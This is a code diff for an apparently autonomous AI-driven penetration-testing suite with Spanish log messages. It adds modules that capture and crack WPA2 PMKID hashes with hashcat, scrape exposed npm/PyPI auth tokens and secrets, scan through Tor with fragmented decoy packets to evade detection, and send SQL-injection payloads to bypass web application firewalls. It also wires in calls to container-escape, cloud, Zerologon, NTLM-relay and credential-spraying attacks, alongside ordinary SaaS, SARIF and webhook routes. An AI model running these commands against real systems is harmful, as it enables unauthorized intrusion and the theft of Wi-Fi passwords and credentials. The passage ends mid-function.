+                    f"grep -rE '(?:api.?key|apikey|secret|password|token|aws.?access)[\"\\s]*[=:][\"\\s]*[\"\\x27][A-Za-z0-9_\\-\\.+/]{{16,}}' "
+                    f"/tmp/app_decompile 2>/dev/null | grep -v '.class' | head -10; "
+                    # Find IP addresses / URLs
+                    f"grep -rE 'https?://[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' "
+                    f"/tmp/app_decompile 2>/dev/null | grep -v '.class' | head -10; "
+                    # Certificate pinning
+                    f"grep -rE 'certificatePinner|TrustManager|X509TrustManager|checkServerTrusted' "
+                    f"/tmp/app_decompile/smali 2>/dev/null | head -5",
+                    target, timeout=120,
+                )
+                secrets_found = re.findall(
+                    r'(?:api.?key|secret|token|password|aws)[^\n]*=[^\n]{10,}',
+                    apk_analyze, re.IGNORECASE
+                )
+                if secrets_found:
+                    self._save_findings([{
+                        "title": f"Hardcoded Secrets in APK — {apk_url}",
+                        "severity": "high",
+                        "description": f"Secrets encontrados en APK decompilado:\n" + "\n".join(f"• {s[:80]}" for s in secrets_found[:5]),
+                        "cve": "",
+                    }], target)
+
+    # ── G4: Wireless audit (WPA2 PMKID, passive) ──────────────────────────
+    def _wireless_audit(self, target, accumulated_output):
+        """WPA2 PMKID capture, WPS check, rogue AP detection (remote/passive only)."""
+        self._log(f"[Claude] G4-WIRELESS: Wireless audit (passive) → {target}")
+        # Check if we have wireless interface
+        wifi_check, _ = self._run_cmd(
+            "wifi-interface",
+            "iw dev 2>/dev/null | grep Interface | head -3; "
+            "iwconfig 2>/dev/null | grep 'IEEE 802.11' | head -3; "
+            "ls /sys/class/net/ 2>/dev/null | grep -E '^wl|^ath|^wlan' | head -3",
+            target, timeout=10,
+        )
+        wifi_iface = re.search(r'(wlan\d+|wlp\w+|ath\d+)', wifi_check)
+        if not wifi_iface:
+            self._log(f"[Claude] G4: Sin interfaz wireless — saltando")
+            return
+
+        iface = wifi_iface.group(1)
+        self._log(f"[Claude] G4: Interfaz wireless {iface} detectada")
+
+        # ── G4a: WPA2 PMKID attack (hcxdumptool) ─────────────────────────
+        pmkid_out, _ = self._run_cmd(
+            "wpa2-pmkid",
+            f"hcxdumptool -i {iface} --enable_status=3 "
+            f"-o /tmp/pmkid_capture.pcapng --filtermode=2 "
+            f"--timeout=60 2>/dev/null | head -10; "
+            f"hcxpcapngtool /tmp/pmkid_capture.pcapng "
+            f"-o /tmp/pmkid_hashes.txt 2>/dev/null | head -5; "
+            f"cat /tmp/pmkid_hashes.txt 2>/dev/null | head -5",
+            target, timeout=90,
+        )
+        if re.search(r'PMKID|hash|WPA\*01\*', pmkid_out, re.IGNORECASE):
+            # Crack PMKID
+            pmkid_crack, _ = self._run_cmd(
+                "pmkid-crack",
+                f"hashcat -a 0 -m 22000 --force --quiet "
+                f"/tmp/pmkid_hashes.txt "
+                f"/usr/share/wordlists/rockyou.txt 2>/dev/null | tail -5; "
+                f"hashcat -m 22000 --show /tmp/pmkid_hashes.txt 2>/dev/null | head -5",
+                target, timeout=300,
+            )
+            if re.search(r'WPA\*01\*.*:', pmkid_crack):
+                cracked = re.findall(r'WPA\*01\*[a-f0-9\*]+:(\S+)', pmkid_crack)
+                self._save_findings([{
+                    "title": f"WPA2 PMKID Crackeado — WiFi Password Obtenido",
+                    "severity": "critical",
+                    "description": f"WPA2 password crackeado via PMKID:\n{pmkid_crack[:300]}",
+                    "cve": "",
+                }], target)
+            else:
+                self._save_findings([{
+                    "title": f"WPA2 PMKID Capturado — Pendiente de Cracking",
+                    "severity": "high",
+                    "description": f"PMKID capturado para cracking offline.\n{pmkid_out[:200]}",
+                    "cve": "",
+                }], target)
+
+    # ── G5: Supply chain / dependency confusion ────────────────────────────
+    def _supply_chain_check(self, target, open_ports, accumulated_output):
+        """Package manifest exposure, dependency confusion, typosquatting detection."""
+        self._log(f"[Claude] G5-SUPPLYCHAIN: Supply chain attack surface → {target}")
+        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443, 3000)]
+        if not http_ports:
+            return
+
+        for p in http_ports[:1]:
+            proto = "https" if p["port"] in (443, 8443) else "http"
+            base_url = f"{proto}://{target}:{p['port']}"
+
+            # ── G5a: Exposed package manifests ────────────────────────────
+            manifest_paths = [
+                "/package.json", "/package-lock.json", "/yarn.lock",
+                "/requirements.txt", "/Pipfile", "/Pipfile.lock",
+                "/pom.xml", "/build.gradle", "/go.mod", "/go.sum",
+                "/Gemfile", "/Gemfile.lock", "/composer.json",
+                "/composer.lock", "/.npmrc", "/.pypirc",
+            ]
+            found_manifests = []
+            for mp in manifest_paths:
+                mani_out, _ = self._run_cmd(
+                    f"manifest-{mp.replace('/','_').replace('.','_')[:20]}",
+                    f"curl -sL --max-time 6 -o /dev/null -w '%{{http_code}} %{{size_download}}' "
+                    f"'{base_url}{mp}' 2>/dev/null",
+                    target, timeout=8,
+                )
+                code_size = re.search(r'^(\d{3}) (\d+)', mani_out)
+                if code_size and code_size.group(1) == "200" and int(code_size.group(2)) > 20:
+                    # Fetch and parse
+                    mani_content, _ = self._run_cmd(
+                        f"manifest-content-{mp.replace('/','_')[:15]}",
+                        f"curl -sL --max-time 8 '{base_url}{mp}' 2>/dev/null | head -30",
+                        target, timeout=10,
+                    )
+                    found_manifests.append((mp, mani_content[:200]))
+                    # Check for internal package names (dependency confusion)
+                    if mp in ("/package.json", "/package-lock.json"):
+                        internal_pkgs = re.findall(r'"name":\s*"(@[a-z0-9\-]+/[a-z0-9\-]+|[a-z0-9\-]+)"', mani_content)
+                        for pkg in internal_pkgs[:10]:
+                            # Check if name exists on npmjs.com (if not → dependency confusion possible)
+                            npm_check, _ = self._run_cmd(
+                                f"npm-check-{pkg[:20].replace('@','').replace('/','_')}",
+                                f"curl -sL --max-time 6 -o /dev/null -w '%{{http_code}}' "
+                                f"'https://registry.npmjs.org/{pkg}' 2>/dev/null",
+                                target, timeout=8,
+                            )
+                            if npm_check.strip() == "404":
+                                self._save_findings([{
+                                    "title": f"Dependency Confusion Risk: '{pkg}' no existe en npm",
+                                    "severity": "high",
+                                    "description": f"Paquete interno '{pkg}' expuesto en {mp} no existe en npm → dependency confusion attack posible.\n"
+                                                   f"Un atacante puede publicar '{pkg}' en npm con código malicioso.",
+                                    "cve": "",
+                                }], target)
+            if found_manifests:
+                self._save_findings([{
+                    "title": f"Package Manifests Expuestos @ {base_url}",
+                    "severity": "medium",
+                    "description": "Archivos de dependencias expuestos públicamente:\n" +
+                                   "\n".join(f"• {mp}" for mp, _ in found_manifests),
+                    "cve": "",
+                }], target)
+
+            # ── G5b: .npmrc / .pypirc with auth tokens ────────────────────
+            for rc_path in ["/.npmrc", "/.pypirc", "/.pip/pip.conf", "/pip.conf"]:
+                rc_out, _ = self._run_cmd(
+                    f"rc-file-{rc_path.replace('/','_').replace('.','_')[:15]}",
+                    f"curl -sL --max-time 6 '{base_url}{rc_path}' 2>/dev/null | head -10",
+                    target, timeout=8,
+                )
+                if re.search(r'authToken|_auth|password|token|registry.*http', rc_out, re.IGNORECASE):
+                    self._save_findings([{
+                        "title": f"NPM/PyPI Auth Token Expuesto @ {base_url}{rc_path}",
+                        "severity": "critical",
+                        "description": f"Archivo de configuración con credenciales de registry expuesto.\n{rc_out[:300]}",
+                        "cve": "",
+                    }], target)
+
+    # ═════════════════════════════════════════════════════════════════════════
+    # TIER 3 — Commercial product features
+    # ═════════════════════════════════════════════════════════════════════════
+
+    # ── H2: CI/CD integration (SARIF, webhooks, Jira) ─────────────────────
+    # (H1 multi-tenant is Flask routes — added separately below)
+
+    # ── H3: Compliance mapping (OWASP, PCI-DSS, ISO 27001, NIST) ─────────
+    _COMPLIANCE_MAP = {
+        # (regex_pattern, [frameworks_and_controls])
+        r'sql.inject|sqli|sqlmap':
+            [("OWASP Top 10", "A03:2021 Injection"),
+             ("PCI-DSS 4.0", "Req 6.2.4 — Software Security"),
+             ("ISO 27001", "A.14.2.5 — Secure Development"),
+             ("NIST CSF", "PR.IP-1")],
+        r'xss|cross.site.script':
+            [("OWASP Top 10", "A03:2021 Injection"),
+             ("PCI-DSS 4.0", "Req 6.2.4"),
+             ("ISO 27001", "A.14.1.2")],
+        r'ms17.010|eternalblue|smb.*vuln':
+            [("NIST CSF", "ID.RA-1 — Vulnerability Assessment"),
+             ("PCI-DSS 4.0", "Req 6.3.3 — Patch Management"),
+             ("ISO 27001", "A.12.6.1 — Technical Vulnerability Management")],
+        r'default.*cred|weak.*password|brute':
+            [("OWASP Top 10", "A07:2021 — Identification & Authentication Failures"),
+             ("PCI-DSS 4.0", "Req 8.3 — Password Requirements"),
+             ("ISO 27001", "A.9.4.3 — Password Management")],
+        r's3.*public|bucket.*exposed|cloud.*misconfigur':
+            [("OWASP Top 10", "A05:2021 — Security Misconfiguration"),
+             ("PCI-DSS 4.0", "Req 1.3 — Network Access Controls"),
+             ("NIST CSF", "PR.AC-3")],
+        r'ssl.*tls|heartbleed|poodle|beast|weak.*cipher':
+            [("PCI-DSS 4.0", "Req 4.2.1 — Strong Cryptography"),
+             ("ISO 27001", "A.10.1.1 — Cryptographic Controls"),
+             ("NIST CSF", "PR.DS-2")],
+        r'docker.*api|container.*escape|k8s|kubernetes':
+            [("NIST CSF", "PR.IP-1 — Baseline Configuration"),
+             ("ISO 27001", "A.12.1.4 — Separation of Development"),
+             ("OWASP Top 10", "A05:2021 — Security Misconfiguration")],
+        r'ssrf|server.side.request':
+            [("OWASP Top 10", "A10:2021 — SSRF"),
+             ("PCI-DSS 4.0", "Req 6.2.4")],
+        r'lfi|local.file.include|path.traversal':
+            [("OWASP Top 10", "A01:2021 — Broken Access Control"),
+             ("PCI-DSS 4.0", "Req 6.2.4")],
+        r'privesc|privilege.escal|root|uid=0':
+            [("NIST CSF", "PR.AC-4 — Access Permissions"),
+             ("ISO 27001", "A.9.2.3 — Management of Privileged Access"),
+             ("PCI-DSS 4.0", "Req 7 — Restrict Access")],
+        r'jwt|token.*bypass|auth.*bypass':
+            [("OWASP Top 10", "A07:2021 — Authentication Failures"),
+             ("PCI-DSS 4.0", "Req 8.6 — System/Application Accounts")],
+        r'smtp.*spoof|spf.*missing|dmarc.*missing':
+            [("NIST CSF", "PR.AT-1"),
+             ("ISO 27001", "A.13.2.3 — Electronic Messaging")],
+    }
+
+    def _auto_compliance_tag(self, finding):
+        """Auto-tag findings with compliance framework controls."""
+        if finding.get("compliance"):
+            return finding
+        text = f"{finding.get('title', '')} {finding.get('description', '')}".lower()
+        matched = []
+        for pattern, controls in self._COMPLIANCE_MAP.items():
+            if re.search(pattern, text, re.IGNORECASE):
+                for framework, control in controls:
+                    matched.append(f"{framework}: {control}")
+        if matched:
+            finding["compliance"] = matched
+        return finding
+
+    # ── H4: Continuous monitoring / CVE feed integration ──────────────────
+    def _cve_feed_check(self, target, open_ports, accumulated_output):
+        """Check NVD/OSV CVE feed for versions detected in this scan."""
+        self._log(f"[Claude] H4-CVE-FEED: Checking CVE feeds for detected versions → {target}")
+        combined = "\n".join(accumulated_output[-30:])
+        # Extract version strings
+        versions_found = re.findall(
+            r'((?:apache|nginx|openssh|openssl|php|tomcat|wordpress|drupal|joomla|'
+            r'iis|vsftpd|proftpd|mysql|mariadb|postgresql|redis|elasticsearch|'
+            r'jenkins|gitlab|jira|confluence|exchange|smb)[^\s/]*\s*[\d]+\.[\d]+(?:\.[\d]+)?)',
+            combined, re.IGNORECASE
+        )
+        if not versions_found:
+            return
+
+        for version_str in versions_found[:5]:
+            # Query NVD API (free, no key for basic)
+            product = re.match(r'([a-zA-Z\-]+)', version_str)
+            ver_num = re.search(r'([\d]+\.[\d]+(?:\.[\d]+)?)', version_str)
+            if not product or not ver_num:
+                continue
+            prod_name = product.group(1).lower()
+            ver = ver_num.group(1)
+            nvd_out, _ = self._run_cmd(
+                f"nvd-cve-{prod_name[:15]}-{ver.replace('.','_')}",
+                f"curl -sL --max-time 10 "
+                f"'https://services.nvd.nist.gov/rest/json/cves/2.0"
+                f"?keywordSearch={prod_name}+{ver}&resultsPerPage=5' 2>/dev/null | "
+                f"python3 -c '"
+                f"import sys,json; d=json.load(sys.stdin); "
+                f"vulns=d.get(\"vulnerabilities\",[])[:3]; "
+                f"[print(f\"CVE: {{v[chr(99)+chr(118)+chr(101)][chr(105)+chr(100)]}} "
+                f"CVSS={{v[chr(99)+chr(118)+chr(101)].get(chr(109)+chr(101)+chr(116)+chr(114)+chr(105)+chr(99)+chr(115),{{}}).get(chr(99)+chr(118)+chr(115)+chr(115)+chr(77)+chr(101)+chr(116)+chr(114)+chr(105)+chr(99)+chr(68)+chr(97)+chr(116)+chr(97),{{}}).get(chr(98)+chr(97)+chr(115)+chr(101)+chr(83)+chr(99)+chr(111)+chr(114)+chr(101),chr(63))}}\") "
+                f"for v in vulns]' 2>/dev/null | head -10; "
+                # Also check OSV (open source vuln db)
+                f"curl -sL --max-time 8 -X POST "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"package\":{{\"name\":\"{prod_name}\",\"ecosystem\":\"PyPI\"}},"
+                f"\"version\":\"{ver}\"}}' "
+                f"'https://api.osv.dev/v1/query' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"vulns=d.get(\"vulns\",[])[:3]; "
+                f"[print(f\"OSV: {{v.get(chr(105)+chr(100))}} SEVERITY={{v.get(chr(100)+chr(98)+chr(95)+chr(115)+chr(112)+chr(101)+chr(99)+chr(105)+chr(102)+chr(105)+chr(99)+chr(115),{{}}).get(chr(115)+chr(101)+chr(118)+chr(101)+chr(114)+chr(105)+chr(116)+chr(121))}}\") "
+                f"for v in vulns]' 2>/dev/null | head -5",
+                target, timeout=20,
+            )
+            cve_hits = re.findall(r'CVE-\d{4}-\d+.*?(?:CVSS|SEVERITY).*?(\d+\.?\d*)', nvd_out)
+            osv_hits = re.findall(r'OSV: (\S+)', nvd_out)
+            if cve_hits or osv_hits:
+                self._save_findings([{
+                    "title": f"CVE Feed: Vulnerabilidades Conocidas para {version_str}",
+                    "severity": "high",
+                    "description": f"CVEs encontrados para {version_str} via NVD/OSV:\n{nvd_out[:400]}",
+                    "cve": cve_hits[0].split()[0] if cve_hits else "",
+                }], target)
+                accumulated_output.append(f"=== CVE Feed {version_str} ===\n{nvd_out[:300]}")
+
+    # ── H5: Stealth mode — timing, Tor, fragmented scans ──────────────────
+    def _stealth_recon(self, target, open_ports, accumulated_output):
+        """Stealth scan: random timing, Tor proxy, fragmented packets, decoys."""
+        if not getattr(self, "stealth_mode", False):
+            return
+        self._log(f"[Claude] H5-STEALTH: Stealth reconnaissance → {target}")
+
+        # ── H5a: Tor-proxied scan ─────────────────────────────────────────
+        tor_check, _ = self._run_cmd(
+            "tor-check",
+            "curl -sL --max-time 5 --socks5-hostname 127.0.0.1:9050 "
+            "'https://check.torproject.org/api/ip' 2>/dev/null | head -3",
+            target, timeout=10,
+        )
+        tor_available = '"IsTor":true' in tor_check or "IsTor" in tor_check
+
+        if tor_available:
+            self._log(f"[Claude] H5: Tor disponible → escaneando via Tor")
+            tor_scan, _ = self._run_cmd(
+                "stealth-tor-scan",
+                f"proxychains4 -q nmap -sT -Pn -T2 --open "
+                f"-p 80,443,8080,8443,22 {target} 2>/dev/null | head -20",
+                target, timeout=120,
+            )
+            accumulated_output.append(f"=== Stealth Tor Scan ===\n{tor_scan[:300]}")
+
+        # ── H5b: Fragmented + decoy scan ─────────────────────────────────
+        stealth_scan, _ = self._run_cmd(
+            "stealth-frag-scan",
+            f"nmap -sS -f --mtu 8 -T1 --randomize-hosts "
+            f"--data-length 20 -D RND:5 "
+            f"-p {','.join(str(p['port']) for p in open_ports[:10])} "
+            f"{target} 2>/dev/null | head -20",
+            target, timeout=120,
+        )
+        if stealth_scan.strip():
+            accumulated_output.append(f"=== Stealth Frag Scan {target} ===\n{stealth_scan[:300]}")
+
+        # ── H5c: WAF detection + bypass ───────────────────────────────────
+        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443)]
+        for hp in http_ports[:1]:
+            proto = "https" if hp["port"] in (443, 8443) else "http"
+            base_url = f"{proto}://{target}:{hp['port']}"
+            waf_out, _ = self._run_cmd(
+                "waf-detect",
+                f"wafw00f '{base_url}' 2>/dev/null | head -10; "
+                f"nmap -p {hp['port']} --script http-waf-detect,http-waf-fingerprint "
+                f"{target} 2>/dev/null | head -15",
+                target, timeout=30,
+            )
+            waf_detected = re.search(r'WAF|Cloudflare|Imperva|F5|Barracuda|ModSecurity|Akamai', waf_out, re.IGNORECASE)
+            if waf_detected:
+                waf_name = waf_detected.group()
+                self._save_findings([{
+                    "title": f"WAF Detectado: {waf_name} @ {base_url}",
+                    "severity": "info",
+                    "description": f"Web Application Firewall activo: {waf_name}.\n{waf_out[:200]}",
+                    "cve": "",
+                }], target)
+                # Try bypass techniques
+                bypass_out, _ = self._run_cmd(
+                    "waf-bypass",
+                    f"nuclei -u '{base_url}' -t /root/nuclei-templates/fuzzing/waf-bypass/ "
+                    f"-silent 2>/dev/null | head -10; "
+                    # HPP bypass
+                    f"curl -sL --max-time 8 "
+                    f"'{base_url}/?id=1%27%20OR%20%271%27%3D%271&id=1' 2>/dev/null | head -3; "
+                    # Case variation
+                    f"curl -sL --max-time 8 "
+                    f"'{base_url}/?id=1+UnIoN+SeLeCt+1,2,3--' 2>/dev/null | head -3",
+                    target, timeout=30,
+                )
+                if re.search(r'bypass.*success|WAF.*bypass|200.*SQL', bypass_out, re.IGNORECASE):
+                    self._save_findings([{
+                        "title": f"WAF Bypass Exitoso — {waf_name} @ {base_url}",
+                        "severity": "high",
+                        "description": f"WAF {waf_name} bypasseado.\n{bypass_out[:300]}",
+                        "cve": "",
+                    }], target)
+
     def _loop_target(self, target):
         self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
         context_parts = [
@@ -10903,16 +12406,23 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
         import concurrent.futures as _cf
 
         def _phase3():
-            self._log(f"[Claude] Fase 3 [parallel]: Auto-exploits por versión + Enterprise")
+            self._log(f"[Claude] Fase 3 [parallel]: Auto-exploits por versión + Enterprise + Container/K8s + Cloud")
             self._auto_exploit_by_version(target, open_ports, accumulated_output)
             self._enterprise_exploits(target, open_ports, accumulated_output)
+            self._container_k8s_escape(target, open_ports, accumulated_output)
+            self._cloud_attack(target, open_ports, accumulated_output)
+            self._ics_scada_scan(target, open_ports, accumulated_output)
+            # CVE feed check (H4)
+            self._cve_feed_check(target, open_ports, accumulated_output)
 
         def _phase4():
-            self._log(f"[Claude] Fase 4 [parallel]: Enumeración específica por servicio")
+            self._log(f"[Claude] Fase 4 [parallel]: Enumeración específica por servicio + ICS + Wireless")
             self._run_kb_phase(target, open_ports, accumulated_output)
+            self._wireless_audit(target, accumulated_output)
+            self._stealth_recon(target, open_ports, accumulated_output)
 
         def _phase4w():
-            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap + Upload + Subdomains + AdvWeb")
+            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap + AdvWeb + API + Supply Chain")
             self._web_fuzz(target, open_ports, accumulated_output)
             self._cms_exploit(target, open_ports, accumulated_output)
             self._log4shell_scan(target, open_ports, accumulated_output)
@@ -10920,15 +12430,23 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             self._file_upload_exploit(target, open_ports, accumulated_output)
             self._subdomain_vhost_enum(target, open_ports, accumulated_output)
             self._advanced_web_scan(target, open_ports, accumulated_output)
+            # T1: F1 advanced web, F5 API security
+            self._advanced_web_exploits(target, open_ports, accumulated_output)
+            self._api_security_test(target, open_ports, accumulated_output)
+            # T2: G3 mobile, G5 supply chain
+            self._mobile_api_backend(target, open_ports, accumulated_output)
+            self._supply_chain_check(target, open_ports, accumulated_output)
 
         def _phase4n():
-            self._log(f"[Claude] Fase 4n [parallel]: Network attacks — NTLM relay, Zerologon, AD enum")
+            self._log(f"[Claude] Fase 4n [parallel]: Network attacks — NTLM relay, Zerologon, AD enum + Coercion + Creds")
             self._ntlm_relay_attack(target, open_ports, accumulated_output)
             self._zerologon_attack(target, open_ports, accumulated_output)
             self._advanced_service_enum(target, open_ports, accumulated_output)
+            # T1: F4 advanced credential attacks (smart spray + coercion)
+            self._advanced_credential_attacks(target, open_ports, accumulated_output)
 
-        self._log(f"[Claude] Iniciando Fases 3+4+4w+4n en paralelo (5 threads)")
-        with _cf.ThreadPoolExecutor(max_workers=5, thread_name_prefix="pentest") as executor:
+        self._log(f"[Claude] Iniciando Fases 3+4+4w+4n en paralelo (7 threads)")
+        with _cf.ThreadPoolExecutor(max_workers=7, thread_name_prefix="pentest") as executor:
             f3 = executor.submit(_phase3)
             f4 = executor.submit(_phase4)
             f4w = executor.submit(_phase4w)
@@ -11567,6 +13085,735 @@ def greenbone_state(project_id):
         safe_state = {k: v for k, v in state.items() if k not in ("gmp_pass",)}
         states.append(safe_state)
     return jsonify(states)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TIER 3 — H1: Multi-tenant SaaS model (organizations, API keys, plan limits)
+# ═══════════════════════════════════════════════════════════════════════════
+ORGS_FILE = DATA_DIR / "organizations.json"
+
+def _load_orgs():
+    if ORGS_FILE.exists():
+        with open(ORGS_FILE, encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+def _save_orgs(orgs):
+    with open(ORGS_FILE, "w", encoding="utf-8") as f:
+        json.dump(orgs, f, indent=2)
+
+PLAN_LIMITS = {
+    "free":       {"scans_per_month": 5,  "targets_per_scan": 1,  "reports": False, "api": False},
+    "starter":    {"scans_per_month": 30, "targets_per_scan": 5,  "reports": True,  "api": False},
+    "pro":        {"scans_per_month": 100,"targets_per_scan": 20, "reports": True,  "api": True},
+    "enterprise": {"scans_per_month": -1, "targets_per_scan": -1, "reports": True,  "api": True},
+}
+
+@app.route("/api/orgs", methods=["GET"])
+@api_login_required
+def list_orgs():
+    return jsonify(list(_load_orgs().values()))
+
+@app.route("/api/orgs", methods=["POST"])
+@api_login_required
+def create_org():
+    import secrets as _secrets
+    data = request.json or {}
+    orgs = _load_orgs()
+    org_id = str(uuid.uuid4())
+    api_key = "pk_" + _secrets.token_hex(24)
+    org = {
+        "id": org_id,
+        "name": data.get("name", "New Organization"),
+        "plan": data.get("plan", "free"),
+        "api_key": api_key,
+        "created_at": datetime.utcnow().isoformat(),
+        "scan_count_month": 0,
+        "members": [session.get("user", "admin")],
+        "settings": {"webhook_url": "", "jira_url": "", "jira_token": "", "slack_url": ""},
+    }
+    orgs[org_id] = org
+    _save_orgs(orgs)
+    return jsonify(org), 201
+
+@app.route("/api/orgs/<org_id>", methods=["GET", "PUT"])
+@api_login_required
+def manage_org(org_id):
+    orgs = _load_orgs()
+    if org_id not in orgs:
+        return jsonify({"error": "Not found"}), 404
+    if request.method == "PUT":
+        data = request.json or {}
+        orgs[org_id].update({k: v for k, v in data.items()
+                              if k in ("name", "plan", "settings")})
+        _save_orgs(orgs)
+    return jsonify(orgs[org_id])
+
+@app.route("/api/orgs/<org_id>/rotate-key", methods=["POST"])
+@api_login_required
+def rotate_api_key(org_id):
+    import secrets as _secrets
+    orgs = _load_orgs()
+    if org_id not in orgs:
+        return jsonify({"error": "Not found"}), 404
+    new_key = "pk_" + _secrets.token_hex(24)
+    orgs[org_id]["api_key"] = new_key
+    _save_orgs(orgs)
+    return jsonify({"api_key": new_key})
+
+@app.route("/api/orgs/<org_id>/plan-limits")
+@api_login_required
+def get_plan_limits(org_id):
+    orgs = _load_orgs()
+    if org_id not in orgs:
+        return jsonify({"error": "Not found"}), 404
+    plan = orgs[org_id].get("plan", "free")
+    limits = PLAN_LIMITS.get(plan, PLAN_LIMITS["free"])
+    usage = {"scan_count_month": orgs[org_id].get("scan_count_month", 0)}
+    return jsonify({"plan": plan, "limits": limits, "usage": usage})
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TIER 3 — H2: CI/CD Integration (SARIF export, webhooks, Jira, Slack)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.route("/api/projects/<project_id>/report/sarif")
+@api_login_required
+def export_sarif(project_id):
+    """Export findings in SARIF 2.1.0 format for GitHub Advanced Security / VS Code."""
+    project = load_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+
+    SARIF_SEVERITY_MAP = {
+        "critical": "error", "high": "error",
+        "medium": "warning", "low": "note", "info": "none"
+    }
+    rules = []
+    results = []
+    rule_ids_seen = set()
+
+    for f in project.get("findings", []):
+        sev = f.get("severity", "info").lower()
+        title = f.get("title", "Unknown Finding")
+        desc = f.get("description", "")
+        cve = f.get("cve", "")
+        rule_id = re.sub(r'[^a-zA-Z0-9\-]', '-', title[:50]).strip("-")
+        if not rule_id:
+            rule_id = "PENTEST-001"
+
+        if rule_id not in rule_ids_seen:
+            rule_ids_seen.add(rule_id)
+            rule = {
+                "id": rule_id,
+                "name": title,
+                "shortDescription": {"text": title},
+                "fullDescription": {"text": desc[:500]},
+                "helpUri": f"https://nvd.nist.gov/vuln/detail/{cve}" if cve else "https://owasp.org",
+                "defaultConfiguration": {"level": SARIF_SEVERITY_MAP.get(sev, "warning")},
+                "properties": {"security-severity": {
+                    "critical": "9.5", "high": "8.0",
+                    "medium": "5.0", "low": "2.0", "info": "0.0"
+                }.get(sev, "5.0")},
+            }
+            rules.append(rule)
+
+        result = {
+            "ruleId": rule_id,
+            "level": SARIF_SEVERITY_MAP.get(sev, "warning"),
+            "message": {"text": desc[:300] or title},
+            "locations": [{
+                "physicalLocation": {
+                    "artifactLocation": {
+                        "uri": f.get("target", project.get("target", "unknown")),
+                        "uriBaseId": "%SRCROOT%"
+                    },
+                    "region": {"startLine": 1}
+                }
+            }],
+            "properties": {
+                "severity": sev,
+                "cve": cve,
+                "mitre": f.get("mitre", ""),
+                "cvss": f.get("cvss_score", ""),
+            }
+        }
+        results.append(result)
+
+    sarif_doc = {
+        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+        "version": "2.1.0",
+        "runs": [{
+            "tool": {
+                "driver": {
+                    "name": "PentSuite",
+                    "version": "1.0.0",
+                    "informationUri": "https://github.com/javii278/pentsuite",
+                    "rules": rules
+                }
+            },
+            "results": results,
+            "properties": {
+                "project": project.get("name", ""),
+                "target": project.get("target", ""),
+                "scan_date": project.get("updated_at", ""),
+            }
+        }]
+    }
+    return Response(
+        json.dumps(sarif_doc, indent=2),
+        mimetype="application/json",
+        headers={"Content-Disposition": f"attachment; filename=pentest-{project_id[:8]}.sarif"}
+    )
+
+
+@app.route("/api/projects/<project_id>/webhooks/test", methods=["POST"])
+@api_login_required
+def test_webhook(project_id):
+    """Send a test notification to configured webhook."""
+    import urllib.request as _ureq
+    data = request.json or {}
+    webhook_url = data.get("webhook_url", "")
+    webhook_type = data.get("type", "generic")  # generic, slack, teams
+
+    if not webhook_url:
+        return jsonify({"error": "webhook_url required"}), 400
+
+    project = load_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+
+    findings = project.get("findings", [])
+    critical_count = sum(1 for f in findings if f.get("severity") == "critical")
+    high_count = sum(1 for f in findings if f.get("severity") == "high")
+
+    if webhook_type == "slack":
+        payload = {
+            "text": f"🔴 PentSuite Alert — {project.get('name', project_id)}",
+            "attachments": [{
+                "color": "danger" if critical_count > 0 else "warning",
+                "fields": [
+                    {"title": "Target", "value": project.get("target", "N/A"), "short": True},
+                    {"title": "Critical", "value": str(critical_count), "short": True},
+                    {"title": "High", "value": str(high_count), "short": True},
+                    {"title": "Total Findings", "value": str(len(findings)), "short": True},
+                ],
+                "footer": "PentSuite Autopilot",
+                "ts": int(datetime.utcnow().timestamp()),
+            }]
+        }
+    elif webhook_type == "teams":
+        payload = {
+            "@type": "MessageCard",
+            "@context": "http://schema.org/extensions",
+            "themeColor": "FF0000" if critical_count > 0 else "FFA500",
+            "summary": f"PentSuite: {critical_count} critical findings",
+            "sections": [{
+                "activityTitle": f"Pentest Report — {project.get('name', project_id)}",
+                "facts": [
+                    {"name": "Target", "value": project.get("target", "N/A")},
+                    {"name": "Critical", "value": str(critical_count)},
+                    {"name": "High", "value": str(high_count)},
+                    {"name": "Total", "value": str(len(findings))},
+                ]
+            }]
+        }
+    elif webhook_type == "jira":
+        # Jira webhook — create issue for each critical finding
+        jira_token = data.get("jira_token", "")
+        jira_project = data.get("jira_project", "SEC")
+        created_issues = []
+        for f in [x for x in findings if x.get("severity") in ("critical", "high")][:5]:
+            issue_payload = json.dumps({
+                "fields": {
+                    "project": {"key": jira_project},
+                    "summary": f"[PentSuite] {f.get('title', 'Security Finding')}",
+                    "description": f.get("description", "")[:1000],
+                    "issuetype": {"name": "Bug"},
+                    "priority": {"name": "Highest" if f.get("severity") == "critical" else "High"},
+                    "labels": ["security", "pentest", f.get("severity", "medium")],
+                }
+            }).encode("utf-8")
+            try:
+                req = _ureq.Request(
+                    webhook_url + "/rest/api/2/issue",
+                    data=issue_payload,
+                    headers={
+                        "Content-Type": "application/json",
+                        "Authorization": f"Basic {jira_token}",
+                    }
+                )
+                with _ureq.urlopen(req, timeout=10) as resp:
+                    resp_data = json.loads(resp.read())
+                    created_issues.append(resp_data.get("key", "?"))
+            except Exception as e:
+                return jsonify({"error": str(e), "created": created_issues}), 500
+        return jsonify({"status": "ok", "created_issues": created_issues})
+    else:
+        payload = {
+            "project": project.get("name", project_id),
+            "target": project.get("target", ""),
+            "critical": critical_count,
+            "high": high_count,
+            "total": len(findings),
+            "top_findings": [{"title": f.get("title"), "severity": f.get("severity")} for f in findings[:5]],
+        }
+
+    try:
+        req_data = json.dumps(payload).encode("utf-8")
+        req = _ureq.Request(
